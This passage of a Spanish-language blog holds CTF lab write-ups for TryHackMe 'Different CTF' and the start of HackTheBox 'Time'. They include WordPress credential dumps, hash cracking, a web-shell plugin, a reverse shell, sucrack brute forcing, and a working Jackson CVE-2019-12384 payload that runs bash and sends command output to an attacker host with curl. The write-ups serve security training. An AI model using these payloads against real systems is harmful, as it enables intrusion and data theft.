14:43 wp-settings.php -rw-r--r-- 1 1001 1001 31337 Sep 30 2020 wp-signup.php -rw-r--r-- 1 1001 1001 4747 Oct 08 2020 wp-trackback.php -rw-r--r-- 1 1001 1001 3236 Jun 08 2020 xmlrpc.php 226 Directory send OK. Dentro del archivo .bash_history no encontramos mucho, pero por el historial hakanbey podria ser un usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ╭─kali@kali ~/thm/differentctf ╰─➤ cat .bash_history id su root ls cd .. ls cd /home ls cd hakanbey/ ls ls -la cd .. ls exit ls cd / ls exit En wp-config.ph encontramos las credenciales para la base de datos phpmyadmin1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ╭─kali@kali ~/thm/differentctf ╰─➤ cat wp-config.php|grep -v \u0026#34;*\u0026#34; \u0026lt;?php define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;phpmyadmin1\u0026#39; ); define( \u0026#39;DB_USER\u0026#39;, \u0026#39;phpmyadmin\u0026#39; ); define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;NOTAPASSWORD\u0026#39; ); define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;@[5K4Q%_gsP%x=QJ]#-lX`BXVNSu7o}5=ht}L~/t%Txt Gx+\u0026lt;BX=,MeiiCHcXvc^\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;,;0^d77wq7mtnGM1o%WaN.MpMJ9Zj69sI^)2cIVdR3h\u0026gt;YP/S:~SrIn+0AY$Adz.K\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;\u0026gt;,V\u0026gt;-2!VKaBkkeRd|K\u0026amp;!([%}!;TfeA`@ikjcC/[]:: $.K\u0026amp;L.-`gk_3%t5/fu_Zd\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;BOk(mP#GI:/ApR/z#w]p\u0026lt;-{smWKoG]qW=gAFR:W=tp_EVb:TN!@cVidma6l@2R$s\u0026#39; ); $table_prefix = \u0026#39;wp_\u0026#39;; define( \u0026#39;WP_DEBUG\u0026#39;, false ); if ( ! defined( \u0026#39;ABSPATH\u0026#39; ) ) { define( \u0026#39;ABSPATH\u0026#39;, __DIR__ . \u0026#39;/\u0026#39; ); } require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;; PHPMYADMIN Ingresamos a phpmyadmin con las credenciales encontradas y vemos dentro de las bases de datos phpmyadmin, phpmyadmin1 dos hashes que pertenecen al usuario hackandbey01. Aunque solamente encontramos la contraseña de la base de datos de phpmyadmin1 la cual es la misma al usuario phpmyadmin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ╭─kali@kali ~/thm/differentctf[4/4] ╰─➤ john --wordlist=wordlist.txt hashes Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status NOTAPASSWORD (?) Warning: Only 80 candidates left, minimum 96 needed for performance. 1g 0:00:00:01 DONE (2021-04-19 21:30) 0.7575g/s 37878p/s 38169c/s 38169C/s bobocel..alexis15 Use the \u0026#34;--show --format=phpass\u0026#34; options to display all of the cracked passwords reliably #$P$BEyLE6bPLjgWQ3IHrLu3or19t0faUh.:123455 Intentamos realizar la escritura de una shell utilizando SQL pero al parecer mysql esta limitado a la carga y escritura de archivos, solamente esta permitida la escritura en una carpeta previamente configurada /var/lib/mysql-files/.\nAdemás encontramos un dominio dentro de las opciones del usuario hakankey01 -\u0026gt; asd.thm en ambas bases de datos, tambien dentro de la tabla wp_option vemos un subdominio especificamente en phpmyadmin1.\nCon la informacion anterior podriamos decir que existen dos bases de datos distintas para dos direcciones de Wordpress. Agregamos el subdominio al archivo /etc/hosts, al visitar el subdominio vemos el mismo tema y contenido.\nWP_USER Editamos la contraseña del usuario hackandbey01 en las base de datos con un hash nuevo que generamos en secure-site.\n1 $P$5ZDzPE45Ci.QxPaPz.03z6TYbakcSQ0 --\u0026gt; password Luego de unos segundos logramos obtener acceso con la nueva contraseña en el panel de ambos wordpress, aunque no logramos subir ningun tipo de archivo o plugin para obtener una shell ya que no tenemos suficientes permisos en el directorio actual.\nFTP \u0026gt; WORDPRESS Anteriormente intentamos subir archivos a FTP pero encontramos que adana.thm no estaba relacionado al directorio de FTP, al subir un archivo a FTP intentamos realizar una solicitud al archivo subido en el subdominio y observamos que este subdominio si está relacionado al directorio de FTP más no tenemos acceso a estos archivos.\n1 2 3 4 5 6 7 8 9 ╭─kali@kali ~/thm/differentctf ╰─➤ cat i.txt hello ╭─kali@kali ~/thm/differentctf ╰─➤ curl -sI http://subdomain.adana.thm/wp-content/plugins/akismet/i.txt HTTP/1.1 403 Forbidden Date: Wed, 21 Apr 2021 04:54:54 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=iso-8859-1 Verificamos en el servicio FTP y vemos que los permisos del archivo subido (i.txt) es diferente (600) al que los demás archivos (644).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 4 1001 1001 4096 Apr 21 04:54 . drwxr-xr-x 5 1001 1001 4096 Apr 21 04:38 .. -rw-r--r-- 1 1001 1001 629 May 09 2016 .htaccess -rw-r--r-- 1 1001 1001 18092 Aug 24 2015 LICENSE.txt drwxr-xr-x 3 1001 1001 4096 Dec 08 22:13 _inc -rw-r--r-- 1 1001 1001 2543 Oct 22 19:16 akismet.php -rw-r--r-- 1 1001 1001 20307 Oct 13 2020 changelog.txt -rw-r--r-- 1 1001 1001 49941 Oct 19 2020 class.akismet-admin.php -rw-r--r-- 1 1001 1001 4663 Jun 28 2018 class.akismet-cli.php -rw-r--r-- 1 1001 1001 11135 Oct 30 2018 class.akismet-rest-api.php -rw-r--r-- 1 1001 1001 2856 Jul 13 2017 class.akismet-widget.php -rw-r--r-- 1 1001 1001 58662 Oct 19 2020 class.akismet.php -rw------- 1 1001 1001 6 Apr 21 04:54 i.txt -rw-r--r-- 1 1001 1001 26 Mar 10 2014 index.php -rw-r--r-- 1 1001 1001 2386 Dec 04 15:04 readme.txt drwxr-xr-x 2 1001 1001 4096 Dec 08 22:13 views -rw-r--r-- 1 1001 1001 6438 Apr 02 2019 wrapper.php 226 Directory send OK. ftp\u0026gt; UPLOAD_PATH \u0026gt; WWW-DATA Como se menciono anteriormente Wordpress mostraba error de permisos de escritura, realizamos una busqueda de los errores que wordpress nos mostraba, la mayoria de las \u0026ldquo;soluciones\u0026rdquo; explica que se debe de cambiar los permisos a la carpeta wp-content pero se necesita acceso a la maquina. En el area de soporte de Wordpress encontramos un comentario que indica la opcion upload_path en wp_options y enlaza un video de como cambiar y solucionar este error en la base de datos.\nVerificamos la direccion en la base de datos de phpmyadmin y observamos que está vacia, por lo que agregamos una direccion en este caso /dev/shm.\nIntentamos subir un archivos los cuales se subieron correctamente aunque no se podian visualizar.\nRealizamos lo mismo en el subdominio, extrañamente pasaba lo mismo.\nPLUGIN \u0026gt; SHELL Intentamos subir un plugin para ejecucion de comandos, además utilizamos las credenciales FTP y direccion 127.0.0.1.\nEl plugin se subió correctamente más no apareció en la direccion que debería al intentar ejecutar comandos.\n1 2 3 4 5 6 ╭─kali@kali ~/thm/differentctf/tmp ╰─➤ curl -sI \u0026#34;http://adana.thm/wp-content/plugins/shell/shell.php?cmd=id\u0026#34; HTTP/1.1 404 Not Found Date: Wed, 21 Apr 2021 07:45:43 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=iso-8859-1 Intentamos subir el mismo plugin en wordpress del subdominio pero aparecia como ya instalado.\nRealizamos la ejecucion de comandos con el plugin pero utilizando la direccion del subdominio en el cual si logramos la ejecucion.\n1 2 3 4 5 6 7 8 9 10 ╭─kali@kali ~/thm/differentctf/tmp ╰─➤ curl -I \u0026#34;http://subdomain.adana.thm/wp-content/plugins/shell/shell.php?cmd=id\u0026#34; HTTP/1.1 200 OK Date: Wed, 21 Apr 2021 07:51:29 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=UTF-8 ╭─kali@kali ~/thm/differentctf/tmp ╰─➤ curl -s \u0026#34;http://subdomain.adana.thm/wp-content/plugins/shell/shell.php?cmd=id\u0026#34; uid=33(www-data) gid=33(www-data) groups=33(www-data) Ejecutamos una shell inversa con python, logramos obtener acceso con el usuario www-data y leer nuestra flag web.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ╭─kali@kali ~/thm/differentctf ╰─➤ listen 1338 listening on [any] 1338 ... connect to [10.2.29.162] from adana.thm [10.10.36.103] 59122 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; cd ../../ ls index.php plugins themes upgrade cd ../ ls announcements wp-admin wp-cron.php wp-mail.php index.php wp-blog-header.php wp-includes wp-settings.php license.txt wp-comments-post.php wp-links-opml.php wp-signup.php readme.html wp-config.php wp-load.php wp-trackback.php wp-activate.php wp-content wp-login.php xmlrpc.php cd ../ ls html subdomain cd html ls announcements wp-blog-header.php wp-links-opml.php wp-trackback.php index.php wp-comments-post.php wp-load.php wwe3bbfla4g.txt license.txt wp-config.php wp-login.php xmlrpc.php readme.html wp-content wp-mail.php wp-activate.php wp-cron.php wp-settings.php wp-admin wp-includes wp-signup.php cat wwe3bbfla4g.txt cat wwe3bbfla4g.txt THM{THIS_FLAG_IS_FAKE_WEBTXT} www-data@ubuntu:/var/www/html$ Realizamos una enumeracion utilizando grep y ls ya que el comando find solo lo pueden ejecutar hakanbey y root, aunque no encontramos ningun archivo que fuera de ayuda por el momento.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 www-data@ubuntu:/dev/shm$ ls -lahR / 2\u0026gt;/dev/null| awk \u0026#39;/:$/\u0026amp;\u0026amp;f{s=$0;f=0}/:$/\u0026amp;\u0026amp;!f{sub(/:$/,\u0026#34;\u0026#34;);s=$0;f=1;next}NF\u0026amp;\u0026amp;f{ print s\u0026#34;/\u0026#34;$0 }\u0026#39; |grep hakanbey /home/drwxr-x--- 15 hakanbey hakanbey 4.0K Mar 15 12:45 hakanbey /usr/bin/-r-srwx--- 1 root hakanbey 13K Jan 14 18:01 binary /usr/bin/-rwxr-x--- 1 root hakanbey 233K Nov 5 2017 find /var/lib/AccountsService/users/-rw-r--r-- 1 root root 248 Jan 10 20:30 hakanbey /var/lib/lightdm-data/drwxrwx--- 2 hakanbey lightdm 4.0K Jan 10 18:32 hakanbey /var/www/html/-rwxrwxrwx 1 hakanbey hakanbey 38 Jan 14 16:50 wwe3bbfla4g.txt www-data@ubuntu:/dev/shm$ www-data@ubuntu:/dev/shm$ ls -lahR / 2\u0026gt;/dev/null| awk \u0026#39;/:$/\u0026amp;\u0026amp;f{s=$0;f=0}/:$/\u0026amp;\u0026amp;!f{sub(/:$/,\u0026#34;\u0026#34;);s=$0;f=1;next}NF\u0026amp;\u0026amp;f{ print s\u0026#34;/\u0026#34;$0 }\u0026#39; |grep \u0026#34;www-data\u0026#34;|grep -v \u0026#34;/var/www/\u0026#34; |grep -v \u0026#34;/proc\u0026#34; | grep -v \u0026#34;/run\u0026#34; /etc/phpmyadmin/-rw-r----- 1 root www-data 520 Jan 10 23:06 config-db.php /etc/phpmyadmin/-rw-r----- 1 root www-data 8 Jan 10 21:43 htpasswd.setup /var/cache/drwxr-xr-x 2 www-data www-data 4.0K Feb 26 2018 tcpdf /var/cache/apache2/drwxr-xr-x 2 www-data www-data 4.0K Aug 12 2020 mod_cache_disk /var/cache/apache2/mod_cache_disk/drwxr-xr-x 2 www-data www-data 4.0K Aug 12 2020 . /var/cache/tcpdf/drwxr-xr-x 2 www-data www-data 4.0K Feb 26 2018 . /var/lib/phpmyadmin/-rw-r----- 1 root www-data 68 Jan 10 21:43 blowfish_secret.inc.php /var/lib/phpmyadmin/-rw-r----- 1 root www-data 0 Jan 10 21:43 config.inc.php /var/lib/phpmyadmin/drwxr-xr-x 2 www-data www-data 4.0K Nov 18 00:16 tmp /var/lib/phpmyadmin/tmp/drwxr-xr-x 2 www-data www-data 4.0K Nov 18 00:16 . /var/lib/ucf/cache/-rw-r----- 1 root www-data 520 Jan 10 23:06 :etc:phpmyadmin:config-db.php www-data@ubuntu:/dev/shm HAKANBEY - USER Siguiendo las diferentes pistas como el tag de la room, utilizamos sucrack para intentar obtener la contraseña del usuario hakanbey con la wordlist del directorio \u0026ldquo;oculto\u0026rdquo;, aunque luego de varias horas no logramos encontrar la contraseña en el wordlist.\nObservamos las pistas dadas en el Discord - TryHackMe, creamos un diccionario a partir de el prefijo de las dos contraseñas previamente encontradas en wordlist.txt logramos encontrar la contraseña del usuaro hakanbey.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 123adanaantinwar # 123adanacrack # 123adana \u0026lt;\u0026lt;\u0026lt;--- prefix www-data@ubuntu:/dev/shm/tmp$ cat wordlist.txt | while read line; do echo 123adana${line}; done \u0026gt; 123adana.txt www-data@ubuntu:/dev/shm/tmp$ ../sucrack -u hakanbey -b 10 -w 10 123adana.txt 447/803863 4015/803863 9895/803863 12796/803863 16252/803863 18071/803863 21805/803863 24561/803863 26824/803863 31110/803863 34770/803863 password is: NOTAPASSWORD www-data@ubuntu:/dev/shm/tmp$ Realizamos la lectura de la flag user.txt.\n1 2 3 4 5 6 7 8 hakanbey@ubuntu:~$ pwd;id /home/hakanbey uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd) hakanbey@ubuntu:~$ ls Desktop Downloads Pictures Templates Videos Documents Music Public user.txt website hakanbey@ubuntu:~$ cat user.txt THM{HELLO_AGAIN_FAKE_FLAG} PRIVILEGE ESCALATION Hacemos una pequeña enumeracion y encontramos un fichero (binary) con permisos SUID. Utilizamos env para obtener una shell root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 hakanbey@ubuntu:~$ find / -perm -4000 2\u0026gt;/dev/null|xargs ls -lah -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Sep 16 2020 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su -rwsr-xr-x 1 root root 27K Sep 16 2020 /bin/umount -rwsr-xr-x 1 root root 22K Jun 28 2019 /usr/bin/arping -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -r-srwx--- 1 root hakanbey 13K Jan 14 18:01 /usr/bin/binary -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 621K Mar 15 13:02 /usr/local/bin/sudo -rwsrwxrwx 1 root root 1.1M May 14 2020 /usr/sbin/exim4 -rwsr-xr-- 1 root dip 370K Jul 23 2020 /usr/sbin/pppd hakanbey@ubuntu:~$ STRACE Al ejecutar el fichero pide la string correcta, al ingresar nuestra contraseña nos mata la shell con hakanbey.\n1 2 3 4 5 hakanbey@ubuntu:/$ /usr/bin/binary I think you should enter the correct string here ==\u0026gt;123adanasubaru pkill: killing pid 1791 failed: Operation not permitted pkill: killing pid 1958 failed: Operation not permitted www-data@ubuntu:/$ Utilizamos ltrace para ver un poco el codigo que esta siendo ejecutado, observamos que warzoneinadana es un string que esta siendo concatenado, además es comparada con la string que ingresamos, en el caso de no ser iguales mata nuestra shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 hakanbey@ubuntu:/$ ltrace /usr/bin/binary strcat(\u0026#34;war\u0026#34;, \u0026#34;zone\u0026#34;) = \u0026#34;warzone\u0026#34; strcat(\u0026#34;warzone\u0026#34;, \u0026#34;in\u0026#34;) = \u0026#34;warzonein\u0026#34; strcat(\u0026#34;warzonein\u0026#34;, \u0026#34;ada\u0026#34;) = \u0026#34;warzoneinada\u0026#34; strcat(\u0026#34;warzoneinada\u0026#34;, \u0026#34;na\u0026#34;) = \u0026#34;warzoneinadana\u0026#34; printf(\u0026#34;I think you should enter the cor\u0026#34;...) = 52 123adanasubaru 123adanasubaru ) = 1 strcmp(\u0026#34;123adanasubaru\u0026#34;, \u0026#34;warzoneinadana\u0026#34;) = -70 strcat(\u0026#34;pki\u0026#34;, \u0026#34;l\u0026#34;) = \u0026#34;pkil\u0026#34; strcat(\u0026#34;pkil\u0026#34;, \u0026#34;l\u0026#34;) = \u0026#34;pkill\u0026#34; strcat(\u0026#34;pkill\u0026#34;, \u0026#34; -9\u0026#34;) = \u0026#34;pkill -9\u0026#34; strcat(\u0026#34;pkill -9\u0026#34;, \u0026#34; -t\u0026#34;) = \u0026#34;pkill -9 -t\u0026#34; strcat(\u0026#34;pkill -9 -t\u0026#34;, \u0026#34; pts\u0026#34;) = \u0026#34;pkill -9 -t pts\u0026#34; strcat(\u0026#34;pkill -9 -t pts\u0026#34;, \u0026#34;/0\u0026#34;) = \u0026#34;pkill -9 -t pts/0\u0026#34; system(\u0026#34;pkill -9 -t pts/0\u0026#34;pkill: killing pid 1791 failed: Operation not permitted pkill: killing pid 1829 failed: Operation not permitted www-data@ubuntu:/$ Al ingresar la frase correcta nos muestra una pista y que se realizo una copia de un archivo JPG a nuestra carpeta principal.\n1 2 3 4 5 6 7 8 hakanbey@ubuntu:~$ /usr/bin/binary warzoneinadana Hint! : Hexeditor 00000020 ==\u0026gt; ???? ==\u0026gt; /home/hakanbey/Desktop/root.jpg (CyberChef) Copy /root/root.jpg ==\u0026gt; /home/hakanbey/root.jpg hakanbey@ubuntu:~$ ls -lah /home/hakanbey/root.jpg -rw-rw-r-- 1 root hakanbey 45K Apr 24 00:46 /home/hakanbey/root.jpg hakanbey@ubuntu:~$ Realizamos la ejecucion de multiples herramientas de esteganografia a la imagen pero no encontramos algun string o pista dentro de esta.\n1 2 3 4 5 6 7 8 9 10 11 12 ╭─kali@kali ~/Pictures ╰─➤ xxd root.jpg|head 00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060 ......JFIF.....` 00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d .`.....xExif..MM 00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275 ...=y._..m..i..u 00000030: 0000 0056 0301 0005 0000 0001 0000 0068 ...V...........h 00000040: 0303 0001 0000 0001 0000 0000 5110 0001 ............Q... 00000050: 0000 0001 0100 0000 5111 0004 0000 0001 ........Q....... 00000060: 0000 0ec4 5112 0004 0000 0001 0000 0ec4 ....Q........... 00000070: 0000 0000 4164 6f62 6520 496d 6167 6552 ....Adobe ImageR 00000080: 6561 6479 0000 0001 86a0 0000 b18f ffdb eady............ 00000090: 0043 0002 0101 0201 0102 0202 0202 0202 .C.............. Despues de dar varias vueltas con herramientas de esteganografia, vemos que la pista se refiere a un indice 00000020 del archivo, obtuvimos el valor hexadecimal.\n1 2 3 ╭─kali@kali ~/Pictures ╰─➤ xxd -s 0x20 -l 16 -c 16 root.jpg 00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275 ...=y._..m..i..u Y utilizando cyberchef logramos obtener la contraseña del usuario root.\nCambiamos al usuario root y logramos obtener nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@ubuntu:~# ls -lah total 92K drwx------ 7 root root 4.0K Mar 15 13:04 . drwxr-xr-x 24 root root 4.0K Jan 10 17:12 .. lrwxrwxrwx 1 root root 9 Jan 14 18:12 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.1K Apr 9 2018 .bashrc drwx------ 2 root root 4.0K Jan 10 18:25 .cache drwx------ 3 root root 4.0K Jan 10 20:43 .gnupg -rw-r--r-- 1 root root 76 Jan 14 11:33 hint.txt drwxr-xr-x 3 root root 4.0K Jan 10 20:13 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 45K Jan 14 09:57 root.jpg -rw-r--r-- 1 root root 38 Jan 14 16:21 root.txt drwxr-xr-x 2 root root 4.0K Jan 11 10:49 .rpmdb drwx------ 2 root root 4.0K Jan 10 17:20 .ssh root@ubuntu:~# cat hint.txt Hexeditor 00000020 ==\u0026gt; ???? ==\u0026gt; /home/hakanbey/Desktop/root.jpg (CyberChef) root@ubuntu:~# cat root.txt THM{YOU_GOT_IT_THIS_IS_YOUR_FLAG} root@ubuntu:~# ","description":"Different CTF es una maquina de TryHackMe, encontramos dos versiones de WordPres y vemos un reto de Esteganografia donde encontramos credenciales para el servicio FTP el cual nos dio acceso a PhpMyAdmin. En este ultimo modificamos las credenciales de los usuarios de ambas bases de datos de WordPress, además modificamos variables que nos permitio subir una shell inversa. Realizamos movimiento lateral creando un wordlist personalizado y realizamos ataque a contraseñas con sucrack. Para escalar privilegios encontramos una pista que nos permitió obtener las credenciales para root.","id":69,"section":"posts","tags":["sucrack","wordpress","wpscan","phpmyadmin","steganography","hex","xxd","ftp","ltrace"],"title":"TryHackMe - Different CTF","uri":"https://sckull.github.io/posts/differentctf/"},{"content":"\rTime expone una funcionalidad para validar estructuras JSON, descubrimos una vulnerabilidad que permite ejecutar comandos con lo que obtuvimos una shell. Escalamos privilegios tras encontrar un servicio que ejecuta un backup con un script en bash.\nInformacion de la Maquina Nombre Time OS Linux Puntos 30 Dificultad Media IP 10.10.10.214 Maker egotisticalSW felamos Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.7, 5.2, 6.4, 3.6, 4.8],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[5, 7, 5, 5, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.91 scan initiated Fri Mar 5 18:37:08 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.214 Warning: 10.10.10.214 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.214 (10.10.10.214) Host is up (0.15s latency). Not shown: 35261 closed ports, 30272 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Mar 5 18:38:23 2021 -- 1 IP address (1 host up) scanned in 74.32 seconds # Nmap 7.91 scan initiated Fri Mar 5 18:39:16 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.10.10.214 Nmap scan report for 10.10.10.214 (10.10.10.214) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA) | 256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA) |_ 256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Mar 5 18:39:27 2021 -- 1 IP address (1 host up) scanned in 11.16 seconds HTTP Encontramos una pagina web en el puerto 80 con lo que parece ser un validador para json.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos, pero solo encontramos los directorios y archivos que pertenecen a la pagina principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 GET 200 OK http://10.10.10.214/ GET 403 Forbidden http://10.10.10.214/.html GET 403 Forbidden http://10.10.10.214/.php GET 200 OK http://10.10.10.214/index.php GET 301 Moved Permanently http://10.10.10.214/images =\u0026gt; http://10.10.10.214/images/ GET 301 Moved Permanently http://10.10.10.214/css =\u0026gt; http://10.10.10.214/css/ GET 301 Moved Permanently http://10.10.10.214/js =\u0026gt; http://10.10.10.214/js/ GET 301 Moved Permanently http://10.10.10.214/javascript =\u0026gt; http://10.10.10.214/javascript/ GET 301 Moved Permanently http://10.10.10.214/vendor =\u0026gt; http://10.10.10.214/vendor/ GET 301 Moved Permanently http://10.10.10.214/fonts =\u0026gt; http://10.10.10.214/fonts/ GET 200 OK http://10.10.10.214/ GET 403 Forbidden http://10.10.10.214/.html GET 403 Forbidden http://10.10.10.214/.php JACKSON RCE Ingresamos un valor en el validador ({\u0026quot;a\u0026quot;:\u0026quot;b\u0026quot;}) para generar un error y nos mostró que utiliza el paquete fasterxml el cual tiene librerias y extensiones utiles, en el caso del error mostrado por el validador vemos que la libreria es Jackson.\n1 Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected close marker \u0026#39;}\u0026#39;: expected \u0026#39;]\u0026#39; (for root starting at [Source: (String)\u0026#34;}\u0026#34;; line: 1, column: 0]) Investigamos vulnerabilidades y exploits para Jackson, y encontramos varios CVEs, por lo que intentamos con diferentes hasta que encontramos el correcto: CVE-2019-12384 Jackson RCE And SSRF. Utilizamos el archivo inject.sql para ejecutar un comando y enviar el resultado a nuestra maquina. Se inicio un mini servidor con python en el puerto 8000 para que el PoC o estructura json descargue el archivo que contiene nuestro comando y lo ejecute.\n1 2 3 4 5 6 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; } $$; CALL SHELLEXEC(\u0026#39;curl -d `id` -X POST http://10.10.10.148:1234/\u0026#39;) En nuestra maquina configuramos el puerto 1234 para obtener el resultado. En la estructura json cambiamos localhost por nuestra direccion IP, e ingresamos esta estructura al validador.\n1 2 3 4 5 6 [ \u0026#34;ch.qos.logback.core.db.DriverManagerConnectionSource\u0026#34;, { \u0026#34;url\u0026#34;: \u0026#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http:\\/\\/10.10.10.148:8000\\/inject.sql\u0026#39;\u0026#34; } ] PERICLES - USER Logrando obtener el resultado de la ejecucion del comando.\nEjecutamos una shell inversa y logramos obtener nuestra shell y flag user.txt.\nPRIVILEGE ESCALATION Ejecutamos pspy y encontramos que hay un servicio que es reiniciado por el usuario root (web_backup.service) con algun cron, y vemos un script que podria estar relacionado con este, /usr/bin/timer_backup.sh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 